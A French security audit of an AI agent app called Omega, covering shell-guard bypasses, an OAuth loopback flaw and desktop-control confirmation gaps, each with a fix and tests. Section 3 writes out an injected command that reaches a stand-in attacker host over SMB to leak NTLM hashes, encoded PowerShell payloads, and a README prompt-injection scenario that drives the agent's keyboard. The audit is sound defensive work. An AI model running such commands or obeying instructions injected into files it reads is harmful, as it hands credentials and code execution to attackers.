# Audit sécurité & vie privée — Omega 0.9.10 → 0.9.11

Date : 2026-10-25 · Ref source : `924f23d` (arbre propre) · Périmètre : `src/` (116 fichiers, 24 044 lignes),
`build.rs`, `installer/omega.wxs`, `Cargo.toml`/`Cargo.lock`, `vendor/whisper-rs` (épinglé, non modifié).
Hors périmètre : `assets/`, `docs/`, les dépendances tierces (analysées par `cargo audit` uniquement).

Méthode : six phases (reconnaissance → chasse par surface → validation source → verdicts → vérification
indépendante → rapport), trois passes. Chaque constat ci-dessous est appuyé par `fichier:ligne` ; tout ce qui
n'a pas pu être démontré est en « rejeté » ou en « observation », sans sévérité.

## 1. Synthèse

| # | Constat | Sévérité | CWE | État |
|---|---------|----------|-----|------|
| 1 | Garde du shell : chemin UNC en barres obliques classé « sûr » | moyenne | CWE-184 | corrigé + test |
| 2 | Garde du shell : exécution déguisée (PowerShell encodé, fenêtre masquée, serveur HTTP Python, `npm ci`, installateurs récents) | moyenne | CWE-184 | corrigé + test |
| 3 | Boucle OAuth : une requête parasite sans `state` annule toute la connexion | faible | CWE-754 | corrigé + test |
| 4 | Contrôle du bureau : clavier/souris non confirmés après lecture d'un fichier de prose (README, notes, HTML) | moyenne | CWE-287 | corrigé + test |

Aucune vulnérabilité critique ou haute n'a été confirmée. Aucune vulnérabilité connue dans les 616 caisses
du `Cargo.lock` (`cargo audit` : 0 avis, 6 caisses non maintenues, toutes transitives).

## 2. Surface d'attaque

| Frontière | Entrées non fiables | Contrôle(s) en place | Verdict |
|---|---|---|---|
| Web → contexte du modèle | page HTML, résultats de recherche | préfixe non fiable, `Reads::untrusted`, gel du watcher et des tests/builds | sain, sauf constat 4 |
| Web → réseau local | URL de `web_fetch` | `is_private_url` + résolveur `PublicOnly` + politique de redirection | sain |
| Modèle → shell | commande du modèle | `guard::assess` (70 règles) → Jev → `approve` | **constats 1 et 2** |
| Modèle → fichiers | chemins des outils | `guard::resolve*`, canonicalisation de l'ancêtre existant, refus `.git` | sain |
| Modèle → bureau | souris/clavier/écran | `approve` si contenu non fiable, outil désactivé par défaut | **constat 4** |
| Dépôt cloné → prompt système | `OMEGA.md`/`AGENTS.md` | texte « conventions », règles de sûreté exclues, shell toujours gardé | accepté (voir 5) |
| Fournisseur OAuth → jeton | code, state, PKCE | S256, state aléatoire 32 octets, écoute 127.0.0.1 | **constat 3** |
| Secrets au repos | clés API, jetons OAuth | DPAPI lié au compte + écriture atomique propriétaire | sain |
| Mise à jour | release GitHub | SHA-256 obligatoire, version assainie, msiexec sur un chemin maîtrisé | sain |
| Dépendances | `Cargo.lock` | `cargo audit` | sain |

## 3. Constats confirmés

### 3.1 Garde du shell : un chemin UNC en barres obliques est classé « sûr » — moyenne (CWE-184)

**Preuve.** La règle « chemin hors du dossier de travail » (`src/tools/guard.rs:114`) couvrait `\\hôte\partage`,
les lecteurs `C:\`, `~`, `$env:`, `%VAR%` et les racines Unix, mais pas la forme `//hôte/partage`. Or `ls`, `type`,
`cat` et `cd` sont dans `SAFE_PROGRAMS` (`src/tools/guard.rs:120`), et une commande `Safe` ne déclenche ni Jev ni
confirmation (`src/tools/shell.rs:99`). `type \\hôte\partage\x` était Risky, `type //hôte/partage/x` était Safe.

**Exploitation.** Une injection (page web ou fichier du dépôt) demande `type //attaquant.example/share/note.txt` :
Windows ouvre une session SMB vers l'hôte attaquant, envoie la réponse NTLMv2 de l'utilisateur, et le contenu
distant revient au modèle — sans aucune demande de confirmation (`auto_approve` vaut `true` par défaut,
`src/domain/settings.rs:179`).

**Correctif.** Alternative `(^|[\s"'=(])//[^/\s]` ajoutée à la règle (`guard.rs:114`) : les deux écritures UNC sont
Risky, tandis que `echo https://example.com/x` reste Safe (le `//` d'une URL est précédé de `:`). `self_test`
(`guard.rs:355`) et le corpus de tests couvrent la régression.

### 3.2 Garde du shell : exécution déguisée — moyenne (CWE-184)

**Preuve.** Trois familles échappaient au classificateur déterministe :

- `powershell -enc <base64>` / `-ec` : les alias de `-EncodedCommand` ne sont pas dans la règle « code inline »
  (`guard.rs:103`), qui ne listait que `-e`, `-c`, `-command`, `-encodedcommand`, `/c` ;
- `python -m http.server` / `-m pip` / `-m smtpd` : `python` est dans `SAFE_PROGRAMS`, aucune règle ne visait les
  modules qui écoutent sur le réseau ou installent ;
- `npm ci`, `npm exec`, `pipx install`, `uv add` : absents de la règle d'installation (`guard.rs:92`), qui ne
  connaissait que `pip|npm|…` + `install|add|uninstall|remove|i`.

**Exploitation.** `python -m http.server 8000` exposait le dossier de travail sur toutes les interfaces sans
confirmation. `powershell -enc <charge>` ne passait que par Jev : sous 35 % de risque, la commande démarrait sans
prompt. `npm ci` exécute les scripts de cycle de vie des dépendances sans passer par la porte d'installation.

**Correctif.** Liste d'alias étendue (`-ec`, `-enc`, `-commandwithargs`, `-encodedarguments`, `/k`, `/r`) ;
nouvelle règle `-w/-windowstyle hidden` (`guard.rs:107`) ; nouvelle règle modules Python (`guard.rs:110`) ;
installateurs complétés (`pipx`, `uv`, `conda`, `mamba`, `bun`, `ci`, `exec`, `link`, `dlx`, `guard.rs:92`).
12 commandes ajoutées au corpus Risky, 4 assertions dans `self_test`.

### 3.3 Boucle OAuth : une requête parasite annule la connexion — faible (CWE-754)

**Preuve.** `serve` documente « les requêtes parasites sont servies puis ignorées » (`pkce.rs:70`) mais traitait
l'absence de `state` comme un `state` faux et faisait `bail!` (`pkce.rs:85-92`).

**Exploitation.** Un processus local non privilégié, une sonde de port de l'antivirus/pare-feu ou un onglet
navigateur qui recharge l'URL de rappel envoie `GET /anything` sur `127.0.0.1:<port>` : l'écoute s'arrête, le
fournisseur n'a plus de destinataire, la connexion échoue. Répété, c'est un déni de la connexion (disponibilité
seulement : le code reste inutilisable sans le vérificateur PKCE).

**Correctif.** Requête sans `state` → réponse puis `continue` (`pkce.rs:85`) ; `state` présent mais faux → refus
maintenu (`pkce.rs:90`). Test `loopback_ignores_a_stray_request`.

### 3.4 Contrôle du bureau : clavier/souris non confirmés après lecture d'un fichier de prose — moyenne (CWE-287)

**Preuve.** `computer` ne demandait confirmation que si `ctx.reads.untrusted()` (`computer.rs:29`), et
`Reads::untrusted` ne suit que le web et les outils tiers (`reads.rs:38`). Or `type`/`key` pilotent n'importe
quelle fenêtre : ils contournent entièrement `guard::assess` (le commentaire de `computer.rs` le reconnaît).

**Exploitation.** L'utilisateur fait corriger un dépôt cloné dont le README contient « installation : Win+R, puis
`powershell -enc …` ». L'agent lit le README (non marqué), prend une capture, envoie la séquence de touches ; la
charge s'exécute avec les droits de l'utilisateur, sans passer par le garde du shell et sans confirmation.

**Correctif.** `Reads` suit la prose lue (`.md`, `.markdown`, `.txt`, `.rst`, `.html`, `.htm`) via `read_file` et
`grep`, depuis l'historique et en direct (`reads.rs:41`, `:86`, `:100`) ; `computer` exige une confirmation sur
`untrusted_input()` pour toute action autre que la capture d'écran. Test `reads.rs:141`.

## 4. Observations (informatives, sans faille démontrée)

- **Restauration de point de contrôle** : `restore` copie/supprime les chemins absolus du manifeste
  (`checkpoint.rs:77`, `:81`). Aucune frontière franchie : le manifeste est sous `%APPDATA%\Omega` (ACL du compte)
  et qui peut le réécrire peut déjà écrire ces fichiers. Durcissement suggéré : stocker la racine de l'espace de
  travail dans le manifeste et refuser toute entrée hors de cette racine.
- **Mode 100 % autonome** : `unattended()` fait court-circuiter tous les `approve` (`settings.rs:204`,
  `tools/mod.rs:178`). Explicitement activé par l'utilisateur, désactivé par défaut.
- **Captures d'écran** : elles partent au fournisseur du modèle sans confirmation (l'écran peut montrer des
  fenêtres sans rapport). Conséquence assumée de l'outil `computer` avec vision ; documentée ici.
- **`OMEGA.md` / `AGENTS.md`** : injectés comme « règles du projet » (`prompts.rs:116`) avec autorité sur le style,
  jamais sur les règles de sûreté (`prompts.rs:111`). Un dépôt malveillant peut y écrire des consignes, mais toute
  commande reste soumise au garde et à la confirmation.
- **Jev** : le routeur reçoit les 1 500 premiers caractères de chaque demande (`router.rs:77`). Choix de
  conception ; sans clé Jev, le routage est local.

## 5. Candidats rejetés (SUSPECT, non démontrés)

| Candidat | Raison du rejet |
|---|---|
| `python -m pip install` contourne la règle d'installation | La règle n'est pas ancrée au programme : `\bpip3?\s+install` matche la sous-chaîne, donc Risky. |
| SSRF vers loopback / LAN via `web_fetch` | `is_private_url` (IPv4-mapped, NAT64, ULA, link-local, RFC1918) + résolveur `PublicOnly` + contrôle à chaque redirection (`http.rs:32-38`, `:85`). Seul un proxy configuré résout à distance, par construction. |
| Évasion du bac à sable par lien symbolique/jonction | Canonicalisation de l'ancêtre existant (`guard.rs:277-280`) et refus `.git` après résolution, alias 8.3 et `.GIT` compris (`guard.rs:312-315`). |
| Lecture de `settings.toml` / des clés API par le shell | Règle BLOCKED (`guard.rs:43`), chemins absolus/`$env:`/`%APPDATA%` Risky, variables secrètes retirées des processus enfants, sortie masquée. |
| Traversée de chemin via le tag de release (mise à jour) | Version assainie `[a-zA-Z0-9.]` (`update.rs:93`), empreinte `sha256:<64 hex>` exigée (`:72`), vérifiée avant `msiexec` (`:101`). |
| Fuite du jeton GitHub via l'environnement du shell | `SECRET_VARS` retirées de l'environnement enfant ; `GH_TOKEN` et l'en-tête basic sont masqués dans la sortie (`shell.rs`). |
| Panique sur entrée non fiable (découpe UTF-8, tables Markdown, regex) | Aucun `unwrap()` en production hors tests ; découpes vérifiées (markdown, compress, search, tree-sitter) ; paniques d'outils converties via `JoinError`. |

## 6. Contrôles vérifiés sains (extraits)

- **Bac à sable fichiers** : `resolve`/`resolve_writable` (`guard.rs:275-320`), refus des écritures `.git`,
  normalisation Windows (`..`, préfixes, ADS), liens résolus.
- **Garde du shell** : règles BLOCKED/RISKY, découpage `| ; & \n { } ( )`, détection des redirections, des
  chemins absolus, des variables sensibles, cache des verdicts Jev borné par commande.
- **Web** : seul http(s), taille plafonnée, DNS public uniquement, redirections revalidées, cache local indexé par
  SHA-256 de l'URL.
- **Secrets** : DPAPI `CRYPTPROTECT_UI_FORBIDDEN` (`secret.rs:55`), écriture atomique propriétaire
  (`store::write_private`), impression d'erreurs sans valeur de clé.
- **OAuth** : S256 + `state` 32 octets, écoute `127.0.0.1` uniquement, code décodé une fois, jeton écrit via
  `write_private` (`claude.rs:172`).
- **Mise à jour** : HTTP durci, empreinte obligatoire, nom de fichier dérivé d'une version assainie, `msiexec`
  sans shell.
- **Processus** : environnement nettoyé (`SECRET_VARS`), `kill_tree` sur arrêt, timeouts, sortie compressée avant
  le modèle, aucun `Command` construit par concaténation de chaîne shell.
- **FFI** : DPAPI, `SendInput`, registre `Run`, tray, whisper — blocs `unsafe` bornés, tailles vérifiées, pas de
  taille fixe non contrôlée.

## 7. Dépendances

`cargo audit` (base du 2026-10-25, 1 352 avis) : **0 vulnérabilité** sur 616 caisses. Avertissements
« non maintenu » : `bincode 1.3.3`, `ttf-parser 0.25.1`, `yaml-rust 0.4.5`, `zbus_names 4.3.5`,
`zvariant 5.15.1`, `zvariant_derive 5.15.1` — toutes transitives (UI/rendu, plates-formes non Windows).

`security_scan` : 212 fichiers, 14 motifs HIGH / 144 MEDIUM / 259 LOW, tous triés. Les deux seules occurrences de
clé AWS sont la clé d'exemple publique `AKIAABCDEFGHIJKLMNOP`, dans la fixture du scanner (`security.rs:219`) et
dans le rapport de la veille ; aucun secret réel. Les HIGH restants sont des `unsafe` FFI (DPAPI, SendInput, tray),
des `-Command` PowerShell à argument constant, et des motifs de test.

## 8. Vérifications

- `cargo clippy --all-targets` : 0 avertissement, 0 erreur.
- `cargo check` : OK après chaque édition (diagnostics de l'outil).
- Suite de tests : verte (watcher), y compris les nouveaux tests `guard::tests::*` (16 commandes Risky,
  5 assertions `self_test`), `pkce::tests::loopback_ignores_a_stray_request`,
  `reads::tests::web_content_marks_the_turn_untrusted`.
- `cargo audit` : voir §7.
- Build de release : `cargo build --release` (voir la sortie du commit).

## 9. Limites de couverture

Aucune passe n'épuise la cible. N'ont pas été revus ligne à ligne : `vendor/whisper-rs` (fork épinglé, non modifié
par ce dépôt), le rendu egui (`ui/`, sans frontière de sécurité), les chemins d'échec réseau des fournisseurs
(comportement, pas sécurité). Pas de test dynamique d'exploitation : les preuves sont statiques (source) et les
correctifs sont couverts par des tests unitaires ; les scénarios SMB/NTLM et injection de bureau demandent un
environnement Windows isolé et restent, pour leur exploitation réelle, à valider par l'utilisateur.
